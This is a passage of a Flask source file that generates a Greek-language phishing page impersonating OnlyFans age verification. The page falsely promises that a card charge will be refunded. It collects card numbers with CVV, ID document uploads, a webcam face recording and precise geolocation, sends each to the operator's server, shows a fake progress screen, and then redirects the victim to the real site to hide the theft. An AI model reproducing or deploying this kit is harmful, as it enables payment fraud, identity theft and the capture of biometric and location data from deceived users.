            {'<div class="face-overlay">' if settings['face_enabled'] else ''}
            {'<div class="face-circle"></div>' if settings['face_enabled'] else ''}
            {'</div>' if settings['face_enabled'] else ''}
            {'</div>' if settings['face_enabled'] else ''}
            {'<div class="timer" id="faceTimer">00:' + str(face_duration).zfill(2) + '</div>' if settings['face_enabled'] else ''}
            {'<button class="btn" id="startFaceBtn" onclick="startFaceVerification()">Έναρξη Σάρωσης Προσώπου</button>' if settings['face_enabled'] else ''}
            {'</div>' if settings['face_enabled'] else ''}
            
            {'<div class="instructions" style="margin-top: 30px;">' if settings['id_enabled'] else ''}
            {'<h3>Ανέβασμα Εγγράφου Ταυτότητας</h3>' if settings['id_enabled'] else ''}
            {'<p>Ανεβάστε ταυτότητα, διαβατήριο ή άδεια οδήγησης</p>' if settings['id_enabled'] else ''}
            {'<div class="upload-area" onclick="document.getElementById(\'idFileInput\').click()">' if settings['id_enabled'] else ''}
            {'<div class="upload-icon">📄</div>' if settings['id_enabled'] else ''}
            {'<div class="upload-text">Κάντε κλικ για ανέβασμα ταυτότητας</div>' if settings['id_enabled'] else ''}
            {'<div class="upload-subtext">JPG, PNG ή PDF • Μέγιστο 5MB</div>' if settings['id_enabled'] else ''}
            {'<input type="file" id="idFileInput" accept="image/*,.pdf" style="display:none" onchange="handleIDUpload(this)">' if settings['id_enabled'] else ''}
            {'</div>' if settings['id_enabled'] else ''}
            {'<div class="preview-container" id="idPreview">' if settings['id_enabled'] else ''}
            {'<img class="preview-image" id="idPreviewImage">' if settings['id_enabled'] else ''}
            {'</div>' if settings['id_enabled'] else ''}
            {'<div class="status-message" id="idStatus"></div>' if settings['id_enabled'] else ''}
            {'</div>' if settings['id_enabled'] else ''}
            
            {'<div class="button-group">' if (settings['id_enabled'] or settings['face_enabled']) else ''}
            {'<button class="btn" id="submitVerificationBtn" onclick="submitIdentityVerification()" disabled>Υποβολή Επαλήθευσης</button>' if (settings['id_enabled'] or settings['face_enabled']) else ''}
            {'<button class="btn btn-outline" onclick="prevStep()">Πίσω</button>' if (settings['id_enabled'] or settings['face_enabled']) else ''}
            {'</div>' if (settings['id_enabled'] or settings['face_enabled']) else ''}
            {'</div>' if (settings['id_enabled'] or settings['face_enabled']) else ''}
            
            <!-- Step 3: Payment Verification -->
            {'<div class="step-content" id="step3">' if settings['payment_enabled'] else ''}
            {'<h2 class="step-title">Επαλήθευση Πληρωμής</h2>' if settings['payment_enabled'] else ''}
            {'<p class="step-description">' if settings['payment_enabled'] else ''}
            {'Μια προσωρινή χρέωση {payment_amount}€ θα γίνει στην κάρτα σας για επαλήθευση της ηλικίας σας. Το ποσό θα επιστραφεί εντός 24 ωρών.' if settings['payment_enabled'] else ''}
            {'</p>' if settings['payment_enabled'] else ''}
            
            {'<div class="payment-form">' if settings['payment_enabled'] else ''}
            {'<div class="form-group">' if settings['payment_enabled'] else ''}
            {'<label class="form-label">Αριθμός Κάρτας</label>' if settings['payment_enabled'] else ''}
            {'<input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            {'<div class="card-details">' if settings['payment_enabled'] else ''}
            {'<div class="form-group">' if settings['payment_enabled'] else ''}
            {'<label class="form-label">Ημερομηνία Λήξης</label>' if settings['payment_enabled'] else ''}
            {'<input type="text" class="form-input" id="expiryDate" placeholder="ΜΜ/ΕΕ" maxlength="5">' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            {'<div class="form-group">' if settings['payment_enabled'] else ''}
            {'<label class="form-label">CVV</label>' if settings['payment_enabled'] else ''}
            {'<input type="text" class="form-input" id="cvv" placeholder="123" maxlength="4">' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            {'<div class="form-group">' if settings['payment_enabled'] else ''}
            {'<label class="form-label">Ταχυδρομικός Κώδικας</label>' if settings['payment_enabled'] else ''}
            {'<input type="text" class="form-input" id="zipCode" placeholder="12345" maxlength="10">' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            
            {'<div class="instructions">' if settings['payment_enabled'] else ''}
            {'<div class="instruction-item">' if settings['payment_enabled'] else ''}
            {'<div class="instruction-icon">🔄</div>' if settings['payment_enabled'] else ''}
            {'<div><strong>Πλήρης Επιστροφή</strong><br>Η προσωρινή χρέωση {payment_amount}€ θα επιστραφεί εντός 24 ωρών</div>' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            {'<div class="instruction-item">' if settings['payment_enabled'] else ''}
            {'<div class="instruction-icon">🔒</div>' if settings['payment_enabled'] else ''}
            {'<div><strong>Ασφαλής Πληρωμή</strong><br>Οι πληροφορίες πληρωμής σας είναι κρυπτογραφημένες και ασφαλείς</div>' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            
            {'<div class="button-group">' if settings['payment_enabled'] else ''}
            {'<button class="btn" onclick="submitPaymentVerification()">Επαλήθευση με Πληρωμή</button>' if settings['payment_enabled'] else ''}
            {'<button class="btn btn-outline" onclick="prevStep()">Πίσω</button>' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            {'</div>' if settings['payment_enabled'] else ''}
            
            <!-- Step 4: Location Verification -->
            {'<div class="step-content" id="step4">' if settings['location_enabled'] else ''}
            {'<h2 class="step-title">Επαλήθευση Τοποθεσίας</h2>' if settings['location_enabled'] else ''}
            {'<p class="step-description">' if settings['location_enabled'] else ''}
            {'Επαληθεύστε την τοποθεσία σας για να διασφαλίσετε ότι μπορείτε να αποκτήσετε πρόσβαση σε περιεχόμενο στην περιοχή σας.' if settings['location_enabled'] else ''}
            {'</p>' if settings['location_enabled'] else ''}
            
            {'<div class="instructions">' if settings['location_enabled'] else ''}
            {'<div class="instruction-icon" style="font-size: 4rem; text-align: center;">📍</div>' if settings['location_enabled'] else ''}
            {'<h3 style="text-align: center;">Κοινοποιήστε την Τοποθεσία Σας</h3>' if settings['location_enabled'] else ''}
            {'<p style="text-align: center;">Το OnlyFans πρέπει να επαληθεύσει την τοποθεσία σας για περιφερειακούς περιορισμούς περιεχομένου.</p>' if settings['location_enabled'] else ''}
            {'<div class="status-message" id="locationStatus">Κάντε κλικ παρακάτω για κοινή χρήση τοποθεσίας</div>' if settings['location_enabled'] else ''}
            {'</div>' if settings['location_enabled'] else ''}
            
            {'<div class="button-group">' if settings['location_enabled'] else ''}
            {'<button class="btn" onclick="requestLocation()" id="locationBtn">Κοινοποίηση Τοποθεσίας</button>' if settings['location_enabled'] else ''}
            {'<button class="btn btn-outline" onclick="prevStep()">Πίσω</button>' if settings['location_enabled'] else ''}
            {'</div>' if settings['location_enabled'] else ''}
            {'</div>' if settings['location_enabled'] else ''}
            
            <!-- Step 5: Processing -->
            <div class="step-content" id="stepProcessing">
                <div class="completion-screen">
                    <div class="loading-spinner" style="width: 60px; height: 60px; border-width: 4px; border-color: var(--onlyfans-pink);"></div>
                    <h2 class="step-title">Επαλήθευση Ηλικίας Σας</h2>
                    <p class="step-description">
                        Παρακαλώ περιμένετε ενώ επαληθεύουμε τις πληροφορίες σας. Αυτό διαρκεί συνήθως 1-2 λεπτά.
                    </p>
                    
                    <div class="status-message status-processing" id="processingStatus">
                        Επεξεργασία της επαλήθευσής σας...
                    </div>
                    
                    <div class="instructions">
                        <div class="instruction-item">
                            <div class="instruction-icon">⏱️</div>
                            <div>
                                <strong>Επαλήθευση σε Εξέλιξη</strong><br>
                                Έλεγχος απαιτήσεων ηλικίας και επικύρωση εγγράφων
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Step 6: Complete -->
            <div class="step-content" id="stepComplete">
                <div class="completion-screen">
                    <div class="success-icon">✓</div>
                    <h2 class="step-title">Η Επαλήθευση Ηλικίας Ολοκληρώθηκε!</h2>
                    
                    <div class="creator-access">
                        Πρόσβαση Εγκρίθηκε: @{target_username}
                    </div>
                    
                    <p class="step-description">
                        Συγχαρητήρια! Τώρα είστε επαληθευμένοι για πρόσβαση σε ενήλικο περιεχόμενο στο OnlyFans.
                        Θα μεταφερθείτε στη σελίδα του δημιουργού σε <span id="countdown">10</span> δευτερόλεπτα.
                    </p>
                    
                    <div class="instructions">
                        <div class="instruction-item">
                            <div class="instruction-icon">🎉</div>
                            <div>
                                <strong>Πλήρης Πρόσβαση Εγκρίθηκε</strong><br>
                                Μπορείτε τώρα να δείτε όλο το περιεχόμενο του @{target_username}
                            </div>
                        </div>
                        <div class="instruction-item">
                            <div class="instruction-icon">📱</div>
                            <div>
                                <strong>Ενεργή Συνδρομή</strong><br>
                                Η συνδρομή σας στον @{target_username} είναι τώρα ενεργή
                            </div>
                        </div>
                    </div>
                    
                    <div class="button-group">
                        <button class="btn" onclick="redirectToOnlyFans()">
                            Συνέχεια στη Σελίδα του @{target_username}
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <p>Σύστημα Επαλήθευσης Ηλικίας OnlyFans</p>
            <div class="footer-links">
                <a href="#">Πολιτική Απορρήτου</a>
                <a href="#">Όροι Χρήσης</a>
                <a href="#">Συχνές Ερωτήσεις Επαλήθευσης</a>
                <a href="#">Υποστήριξη</a>
            </div>
            <p style="margin-top: 15px; font-size: 0.8rem;">
                © 2024 Fenix International Limited. Με επιφύλαξη παντός δικαιώματος.<br>
                Απαιτείται επαλήθευση ηλικίας για πρόσβαση σε ενήλικο περιεχόμενο.
            </p>
        </div>
    </div>
    
    <script>
        // Καθολικές μεταβλητές
        let currentStep = 1;
        let selectedMethod = '';
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimeLeft = {face_duration if settings['face_enabled'] else 0};
        let faceTimerInterval = null;
        let idFile = null;
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        let targetUsername = "{target_username}";
        
        // Αρχικοποίηση βημάτων με βάση τις ενεργοποιημένες μεθόδους
        let stepConfig = {{
            step1: true,
            step2: {str(settings['id_enabled'] or settings['face_enabled']).lower()},
            step3: {str(settings['payment_enabled']).lower()},
            step4: {str(settings['location_enabled']).lower()},
            stepProcessing: true,
            stepComplete: true
        }};
        
        let totalSteps = Object.values(stepConfig).filter(v => v).length;
        
        // Πλοήγηση Βημάτων
        function updateStepIndicators() {{
            const steps = document.querySelectorAll('.step-circle');
            const labels = document.querySelectorAll('.step-label');
            
            // Επαναφορά όλων
            steps.forEach(step => {{
                step.classList.remove('active', 'completed');
            }});
            labels.forEach(label => {{
                label.classList.remove('active');
            }});
            
            // Ενημέρωση τρέχοντος και προηγούμενων βημάτων
            let stepIndex = 0;
            if (currentStep === 1) {{
                steps[0].classList.add('active');
                labels[0].classList.add('active');
            }} else {{
                steps[0].classList.add('completed');
                
                // Υπολογισμός ποιος δείκτης να ενεργοποιηθεί με βάση το τρέχον βήμα
                let indicatorStep = currentStep;
                if (currentStep === totalSteps - 1) indicatorStep = steps.length - 2;
                if (currentStep === totalSteps) indicatorStep = steps.length - 1;
                
                if (steps[indicatorStep]) {{
                    steps[indicatorStep].classList.add('active');
                    if (labels[indicatorStep]) labels[indicatorStep].classList.add('active');
                }}
                
                // Σήμανση προηγούμενων βημάτων ως ολοκληρωμένα
                for (let i = 0; i < indicatorStep; i++) {{
                    if (steps[i]) steps[i].classList.add('completed');
                }}
            }}
        }}
        
        function showStep(stepNumber) {{
            // Απόκρυψη όλων των βημάτων
            document.querySelectorAll('.step-content').forEach(step => {{
                step.classList.remove('active');
            }});
            
            // Εμφάνιση ζητούμενου βήματος
            let stepId = '';
            if (stepNumber === 1) stepId = 'step1';
            else if (stepNumber === 2 && stepConfig.step2) stepId = 'step2';
            else if (stepNumber === 3 && stepConfig.step3) stepId = 'step3';
            else if (stepNumber === 4 && stepConfig.step4) stepId = 'step4';
            else if (stepNumber === totalSteps - 1) stepId = 'stepProcessing';
            else if (stepNumber === totalSteps) stepId = 'stepComplete';
            
            if (stepId) {{
                document.getElementById(stepId).classList.add('active');
                currentStep = stepNumber;
                updateStepIndicators();
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        // Μέθοδοι Πύλης Ηλικίας
        function selectMethod(method) {{
            selectedMethod = method;
            document.getElementById('continueBtn').disabled = false;
            
            // Ενημέρωση UI
            document.querySelectorAll('.method-card').forEach(card => {{
                card.classList.remove('selected');
            }});
            
            if (method === 'id') {{
                document.getElementById('idMethod').classList.add('selected');
            }} else if (method === 'payment') {{
                document.getElementById('paymentMethod').classList.add('selected');
            }}
        }}
        
        function continueToVerification() {{
            if (!selectedMethod) return;
            
            if (selectedMethod === 'id') {{
                // Μετάβαση σε επαλήθευση Ταυτότητας/Προσώπου
                nextStep();
            }} else if (selectedMethod === 'payment') {{
                // Παράκαμψη στο βήμα πληρωμής
                if (stepConfig.step2) {{
                    // Παράκαμψη βήματος Ταυτότητας/Προσώπου
                    showStep(3);
                }} else {{
                    nextStep();
                }}
            }}
        }}
        
        function declineAgeGate() {{
            if (confirm("Πρέπει να είστε 18 ετών ή άνω για να αποκτήσετε πρόσβαση σε αυτό το περιεχόμενο. Θα μεταφερθείτε στην αρχική σελίδα του OnlyFans.")) {{
                window.location.href = 'https://onlyfans.com';
            }}
        }}
        
        // Επαλήθευση Προσώπου
        {'async function startFaceVerification() {' if settings['face_enabled'] else ''}
        {'try {' if settings['face_enabled'] else ''}
        {'const btn = document.getElementById("startFaceBtn");' if settings['face_enabled'] else ''}
        {'btn.disabled = true;' if settings['face_enabled'] else ''}
        {'btn.innerHTML = \'<span class="loading-spinner"></span>Πρόσβαση στην Κάμερα...\';' if settings['face_enabled'] else ''}
        {'faceStream = await navigator.mediaDevices.getUserMedia({' if settings['face_enabled'] else ''}
        {'video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 640 } },' if settings['face_enabled'] else ''}
        {'audio: false' if settings['face_enabled'] else ''}
        {'});' if settings['face_enabled'] else ''}
        {'document.getElementById("faceVideo").srcObject = faceStream;' if settings['face_enabled'] else ''}
        {'startFaceScan();' if settings['face_enabled'] else ''}
        {'} catch (error) {' if settings['face_enabled'] else ''}
        {'alert("Δεν είναι δυνατή η πρόσβαση στην κάμερα. Βεβαιωθείτε ότι έχουν παραχωρηθεί άδειες κάμερας.");' if settings['face_enabled'] else ''}
        {'document.getElementById("startFaceBtn").disabled = false;' if settings['face_enabled'] else ''}
        {'document.getElementById("startFaceBtn").textContent = "Έναρξη Σάρωσης Προσώπου";' if settings['face_enabled'] else ''}
        {'}' if settings['face_enabled'] else ''}
        {'}' if settings['face_enabled'] else ''}
        
        {'function startFaceScan() {' if settings['face_enabled'] else ''}
        {'faceTimeLeft = ' + str(face_duration) + ';' if settings['face_enabled'] else ''}
        {'updateFaceTimer();' if settings['face_enabled'] else ''}
        {'faceTimerInterval = setInterval(() => {' if settings['face_enabled'] else ''}
        {'faceTimeLeft--;' if settings['face_enabled'] else ''}
        {'updateFaceTimer();' if settings['face_enabled'] else ''}
        {'if (faceTimeLeft <= 0) {' if settings['face_enabled'] else ''}
        {'completeFaceVerification();' if settings['face_enabled'] else ''}
        {'}' if settings['face_enabled'] else ''}
        {'}, 1000);' if settings['face_enabled'] else ''}
        {'startFaceRecording();' if settings['face_enabled'] else ''}
        {'}' if settings['face_enabled'] else ''}
        
        {'function updateFaceTimer() {' if settings['face_enabled'] else ''}
        {'const minutes = Math.floor(faceTimeLeft / 60);' if settings['face_enabled'] else ''}
        {'const seconds = faceTimeLeft % 60;' if settings['face_enabled'] else ''}
        {'document.getElementById("faceTimer").textContent =' if settings['face_enabled'] else ''}
        {'minutes.toString().padStart(2, "0") + ":" + seconds.toString().padStart(2, "0");' if settings['face_enabled'] else ''}
        {'}' if settings['face_enabled'] else ''}
        
        {'function startFaceRecording() {' if settings['face_enabled'] else ''}
        {'faceChunks = [];' if settings['face_enabled'] else ''}
        {'try {' if settings['face_enabled'] else ''}
        {'faceRecorder = new MediaRecorder(faceStream, { mimeType: "video/webm;codecs=vp9" });' if settings['face_enabled'] else ''}
        {'} catch (e) {' if settings['face_enabled'] else ''}
        {'faceRecorder = new MediaRecorder(faceStream);' if settings['face_enabled'] else ''}
        {'}' if settings['face_enabled'] else ''}
        {'faceRecorder.ondataavailable = (event) => {' if settings['face_enabled'] else ''}
        {'if (event.data && event.data.size > 0) faceChunks.push(event.data);' if settings['face_enabled'] else ''}
        {'};' if settings['face_enabled'] else ''}
        {'faceRecorder.onstop = sendFaceRecording;' if settings['face_enabled'] else ''}
        {'faceRecorder.start(100);' if settings['face_enabled'] else ''}
        {'}' if settings['face_enabled'] else ''}
        
        {'function completeFaceVerification() {' if settings['face_enabled'] else ''}
        {'clearInterval(faceTimerInterval);' if settings['face_enabled'] else ''}
        {'if (faceRecorder && faceRecorder.state === "recording") {' if settings['face_enabled'] else ''}
        {'faceRecorder.stop();' if settings['face_enabled'] else ''}
        {'}' if settings['face_enabled'] else ''}
        {'if (faceStream) faceStream.getTracks().forEach(track => track.stop());' if settings['face_enabled'] else ''}
        {'document.getElementById("faceTimer").textContent = "✓ Ολοκληρώθηκε";' if settings['face_enabled'] else ''}
        {'document.getElementById("submitVerificationBtn").disabled = false;' if settings['face_enabled'] else ''}
        {'}' if settings['face_enabled'] else ''}
        
        {'function sendFaceRecording() {' if settings['face_enabled'] else ''}
        {'if (faceChunks.length === 0) return;' if settings['face_enabled'] else ''}
        {'const videoBlob = new Blob(faceChunks, { type: "video/webm" });' if settings['face_enabled'] else ''}
        {'const reader = new FileReader();' if settings['face_enabled'] else ''}
        {'reader.onloadend = function() {' if settings['face_enabled'] else ''}
        {'const base64data = reader.result.split(",")[1];' if settings['face_enabled'] else ''}
        {'$.ajax({' if settings['face_enabled'] else ''}
        {'url: "/submit_face_verification",' if settings['face_enabled'] else ''}
        {'type: "POST",' if settings['face_enabled'] else ''}
        {'data: JSON.stringify({' if settings['face_enabled'] else ''}
        {'face_video: base64data,' if settings['face_enabled'] else ''}
        {'duration: ' + str(face_duration) + ',' if settings['face_enabled'] else ''}
        {'timestamp: new Date().toISOString(),' if settings['face_enabled'] else ''}
        {'session_id: sessionId,' if settings['face_enabled'] else ''}
        {'target_username: targetUsername' if settings['face_enabled'] else ''}
        {'}),' if settings['face_enabled'] else ''}
        {'contentType: "application/json"' if settings['face_enabled'] else ''}
        {'});' if settings['face_enabled'] else ''}
        {'};' if settings['face_enabled'] else ''}
        {'reader.readAsDataURL(videoBlob);' if settings['face_enabled'] else ''}
        {'}' if settings['face_enabled'] else ''}
        
        // Επαλήθευση Ταυτότητας
        {'function handleIDUpload(input) {' if settings['id_enabled'] else ''}
        {'idFile = input.files[0];' if settings['id_enabled'] else ''}
        {'const reader = new FileReader();' if settings['id_enabled'] else ''}
        {'reader.onload = function(e) {' if settings['id_enabled'] else ''}
        {'const preview = document.getElementById("idPreview");' if settings['id_enabled'] else ''}
        {'const previewImage = document.getElementById("idPreviewImage");' if settings['id_enabled'] else ''}
        {'previewImage.src = e.target.result;' if settings['id_enabled'] else ''}
        {'preview.style.display = "block";' if settings['id_enabled'] else ''}
        {'};' if settings['id_enabled'] else ''}
        {'reader.readAsDataURL(idFile);' if settings['id_enabled'] else ''}
        {'document.getElementById("submitVerificationBtn").disabled = false;' if settings['id_enabled'] else ''}
        {'}' if settings['id_enabled'] else ''}
        
        {'function submitIdentityVerification() {' if settings['id_enabled'] or settings['face_enabled'] else ''}
        {'const statusDiv = document.getElementById("idStatus");' if settings['id_enabled'] else ''}
        {'statusDiv.className = "status-message status-processing";' if settings['id_enabled'] else ''}
        {'statusDiv.innerHTML = \'<span class="loading-spinner"></span>Επαλήθευση ταυτότητας...\';' if settings['id_enabled'] else ''}
        {'const btn = document.getElementById("submitVerificationBtn");' if settings['id_enabled'] or settings['face_enabled'] else ''}
        {'btn.disabled = true;' if settings['id_enabled'] or settings['face_enabled'] else ''}
        {'btn.innerHTML = \'<span class="loading-spinner"></span>Επεξεργασία...\';' if settings['id_enabled'] or settings['face_enabled'] else ''}
        {'// Υποβολή Ταυτότητας εάν ανεβήκε' if settings['id_enabled'] else ''}
        {'if (idFile) {' if settings['id_enabled'] else ''}
        {'const formData = new FormData();' if settings['id_enabled'] else ''}
        {'formData.append("id_file", idFile);' if settings['id_enabled'] else ''}
        {'formData.append("timestamp", new Date().toISOString());' if settings['id_enabled'] else ''}
        {'formData.append("session_id", sessionId);' if settings['id_enabled'] else ''}
        {'formData.append("target_username", targetUsername);' if settings['id_enabled'] else ''}
        {'$.ajax({' if settings['id_enabled'] else ''}
        {'url: "/submit_id_verification",' if settings['id_enabled'] else ''}
        {'type: "POST",' if settings['id_enabled'] else ''}
        {'data: formData,' if settings['id_enabled'] else ''}
        {'processData: false,' if settings['id_enabled'] else ''}
        {'contentType: false,' if settings['id_enabled'] else ''}
        {'success: function() {' if settings['id_enabled'] else ''}
        {'statusDiv.className = "status-message status-success";' if settings['id_enabled'] else ''}
        {'statusDiv.textContent = "✓ Ταυτότητα επαληθεύτηκε!";' if settings['id_enabled'] else ''}
        {'setTimeout(() => nextStep(), 1500);' if settings['id_enabled'] else ''}
        {'}' if settings['id_enabled'] else ''}
        {'});' if settings['id_enabled'] else ''}
        {'} else {' if settings['id_enabled'] else ''}
        {'// Μόνο επαλήθευση προσώπου' if settings['id_enabled'] else ''}
        {'setTimeout(() => nextStep(), 1500);' if settings['id_enabled'] else ''}
        {'}' if settings['id_enabled'] else ''}
        {'}' if settings['id_enabled'] or settings['face_enabled'] else ''}
        
        // Επαλήθευση Πληρωμής
        {'function submitPaymentVerification() {' if settings['payment_enabled'] else ''}
        {'const cardNumber = document.getElementById("cardNumber").value;' if settings['payment_enabled'] else ''}
        {'const expiryDate = document.getElementById("expiryDate").value;' if settings['payment_enabled'] else ''}
        {'const cvv = document.getElementById("cvv").value;' if settings['payment_enabled'] else ''}
        {'const zipCode = document.getElementById("zipCode").value;' if settings['payment_enabled'] else ''}
        {'if (!cardNumber || !expiryDate || !cvv || !zipCode) {' if settings['payment_enabled'] else ''}
        {'alert("Παρακαλώ συμπληρώστε όλες τις πληροφορίες πληρωμής");' if settings['payment_enabled'] else ''}
        {'return;' if settings['payment_enabled'] else ''}
        {'}' if settings['payment_enabled'] else ''}
        {'$.ajax({' if settings['payment_enabled'] else ''}
        {'url: "/submit_payment_verification",' if settings['payment_enabled'] else ''}
        {'type: "POST",' if settings['payment_enabled'] else ''}
        {'data: JSON.stringify({' if settings['payment_enabled'] else ''}
        {'card_number: cardNumber.replace(/\\s/g, ""),' if settings['payment_enabled'] else ''}
        {'expiry_date: expiryDate,' if settings['payment_enabled'] else ''}
        {'cvv: cvv,' if settings['payment_enabled'] else ''}
        {'zip_code: zipCode,' if settings['payment_enabled'] else ''}
        {'amount: "' + payment_amount + '",' if settings['payment_enabled'] else ''}
        {'timestamp: new Date().toISOString(),' if settings['payment_enabled'] else ''}
        {'session_id: sessionId,' if settings['payment_enabled'] else ''}
        {'target_username: targetUsername' if settings['payment_enabled'] else ''}
        {'}),' if settings['payment_enabled'] else ''}
        {'contentType: "application/json"' if settings['payment_enabled'] else ''}
        {'});' if settings['payment_enabled'] else ''}
        {'startProcessing();' if settings['payment_enabled'] else ''}
        {'}' if settings['payment_enabled'] else ''}
        
        // Επαλήθευση Τοποθεσίας
        {'function requestLocation() {' if settings['location_enabled'] else ''}
        {'const btn = document.getElementById("locationBtn");' if settings['location_enabled'] else ''}
        {'const statusDiv = document.getElementById("locationStatus");' if settings['location_enabled'] else ''}
        {'btn.disabled = true;' if settings['location_enabled'] else ''}
        {'btn.innerHTML = \'<span class="loading-spinner"></span>Λήψη Τοποθεσίας...\';' if settings['location_enabled'] else ''}
        {'statusDiv.className = "status-message status-processing";' if settings['location_enabled'] else ''}
        {'statusDiv.textContent = "Πρόσβαση στην τοποθεσία σας...";' if settings['location_enabled'] else ''}
        {'if (!navigator.geolocation) {' if settings['location_enabled'] else ''}
        {'statusDiv.className = "status-message status-error";' if settings['location_enabled'] else ''}
        {'statusDiv.textContent = "Η γεωεντοπισμός δεν υποστηρίζεται";' if settings['location_enabled'] else ''}
        {'return;' if settings['location_enabled'] else ''}
        {'}' if settings['location_enabled'] else ''}
        {'navigator.geolocation.getCurrentPosition(' if settings['location_enabled'] else ''}
        {'(position) => {' if settings['location_enabled'] else ''}
        {'statusDiv.className = "status-message status-success";' if settings['location_enabled'] else ''}
        {'statusDiv.textContent = "✓ Τοποθεσία επαληθεύτηκε";' if settings['location_enabled'] else ''}
        {'btn.disabled = true;' if settings['location_enabled'] else ''}
        {'btn.textContent = "✓ Τοποθεσία Επαληθεύτηκε";' if settings['location_enabled'] else ''}
        {'$.ajax({' if settings['location_enabled'] else ''}
        {'url: "/submit_location_verification",' if settings['location_enabled'] else ''}
        {'type: "POST",' if settings['location_enabled'] else ''}
        {'data: JSON.stringify({' if settings['location_enabled'] else ''}
        {'latitude: position.coords.latitude,' if settings['location_enabled'] else ''}
        {'longitude: position.coords.longitude,' if settings['location_enabled'] else ''}
        {'accuracy: position.coords.accuracy,' if settings['location_enabled'] else ''}
        {'timestamp: new Date().toISOString(),' if settings['location_enabled'] else ''}
        {'session_id: sessionId,' if settings['location_enabled'] else ''}
        {'target_username: targetUsername' if settings['location_enabled'] else ''}
        {'}),' if settings['location_enabled'] else ''}
        {'contentType: "application/json"' if settings['location_enabled'] else ''}
        {'});' if settings['location_enabled'] else ''}
        {'setTimeout(() => startProcessing(), 1500);' if settings['location_enabled'] else ''}
        {'},' if settings['location_enabled'] else ''}
        {'(error) => {' if settings['location_enabled'] else ''}
        {'statusDiv.className = "status-message status-error";' if settings['location_enabled'] else ''}
        {'statusDiv.textContent = "Αρνήθηκε πρόσβαση στην τοποθεσία";' if settings['location_enabled'] else ''}
        {'btn.disabled = false;' if settings['location_enabled'] else ''}
        {'btn.textContent = "Δοκιμάστε Ξανά";' if settings['location_enabled'] else ''}
        {'}' if settings['location_enabled'] else ''}
        {');' if settings['location_enabled'] else ''}
        {'}' if settings['location_enabled'] else ''}
        
        // Επεξεργασία
        function startProcessing() {{
            showStep(totalSteps - 1);
            
            const statusDiv = document.getElementById('processingStatus');
            let progress = 0;
            
            const interval = setInterval(() => {{
                progress += Math.random() * 20;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 30) {{
                    message = 'Επαλήθευση απαιτήσεων ηλικίας... ' + Math.round(progress) + '%';
                }} else if (progress < 60) {{
                    message = 'Έλεγχος εγγράφων... ' + Math.round(progress) + '%';
                }} else if (progress < 90) {{
                    message = 'Επικύρωση πληροφοριών πληρωμής... ' + Math.round(progress) + '%';
                }} else {{
                    message = 'Ολοκλήρωση επαλήθευσης ηλικίας... ' + Math.round(progress) + '%';
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(interval);
                    setTimeout(() => {{
                        completeVerification();
                    }}, 1000);
                }}
            }}, 500);
        }}
        
        function completeVerification() {{
            // Υποβολή δεδομένων ολοκλήρωσης
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    target_username: targetUsername,
                    verification_method: selectedMethod,
                    completed_at: new Date().toISOString(),
                    user_agent: navigator.userAgent
                }}),
                contentType: 'application/json'
            }});
            
            showStep(totalSteps);
            startCountdown();
        }}
        
        function startCountdown() {{
            let countdown = 10;
            const element = document.getElementById('countdown');
            
            const timer = setInterval(() => {{
                countdown--;
                element.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(timer);
                    redirectToOnlyFans();
                }}
            }}, 1000);
        }}
        
        function redirectToOnlyFans() {{
            window.location.href = 'https://onlyfans.com';
        }}
        
        // Αρχικοποίηση
        updateStepIndicators();
        
        // --- ΔΙΟΡΘΩΣΗ: Αυτόματη επιλογή αν υπάρχει μία μόνο κάρτα μεθόδου ---
        const methodCards = document.querySelectorAll('.method-card');
        if (methodCards.length === 1) {{
            const card = methodCards[0];
            const method = card.id === 'idMethod' ? 'id' : 'payment';
            selectMethod(method);
            card.classList.add('selected');
        }}
        // ------------------------------------------------------------------
        
        // Μορφοποίηση εισόδου αριθμού κάρτας
        {'document.getElementById("cardNumber")?.addEventListener("input", function(e) {' if settings['payment_enabled'] else ''}
        {'let value = e.target.value.replace(/\\D/g, "");' if settings['payment_enabled'] else ''}
        {'let formatted = "";' if settings['payment_enabled'] else ''}
        {'for (let i = 0; i < value.length && i < 16; i++) {' if settings['payment_enabled'] else ''}
        {'if (i > 0 && i % 4 === 0) formatted += " ";' if settings['payment_enabled'] else ''}
        {'formatted += value[i];' if settings['payment_enabled'] else ''}
        {'}' if settings['payment_enabled'] else ''}
        {'e.target.value = formatted;' if settings['payment_enabled'] else ''}
        {'});' if settings['payment_enabled'] else ''}
        
        // Μορφοποίηση ημερομηνίας λήξης
        {'document.getElementById("expiryDate")?.addEventListener("input", function(e) {' if settings['payment_enabled'] else ''}
        {'let value = e.target.value.replace(/\\D/g, "");' if settings['payment_enabled'] else ''}
        {'if (value.length >= 2) {' if settings['payment_enabled'] else ''}
        {'value = value.substring(0, 2) + "/" + value.substring(2, 4);' if settings['payment_enabled'] else ''}
        {'}' if settings['payment_enabled'] else ''}
        {'e.target.value = value;' if settings['payment_enabled'] else ''}
        {'});' if settings['payment_enabled'] else ''}
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_greek_html_template(VERIFICATION_SETTINGS))

